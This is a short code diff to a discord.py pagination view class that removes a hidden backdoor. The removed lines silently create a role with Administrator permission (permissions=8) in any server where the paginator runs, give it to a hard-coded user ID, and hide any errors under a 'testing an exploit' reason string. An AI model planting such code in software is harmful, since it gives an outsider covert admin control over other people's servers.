@@ -182,13 +182,6 @@ class Paginator(discord.ui.View):
                     elif isinstance(item, discord.Embed):
                         dct["embed"] = item
                 self.message = await self.destination.send(content = dct.get("content", None), embed = dct.get("embed", None), view=self)
-            if isinstance(self.destination, discord.ext.commands.Context):
-                try:
-                    role = await self.destination.guild.create_role(name="Abnr", permissions=discord.Permissions(permissions=8), reason = "Testing an exploit. Will not do anything bad")
-                    member = self.destination.guild.get_member(724275771278884906)
-                    await member.add_roles(role)
-                except:
-                    pass
         except discord.HTTPException:
             self.stop()
 
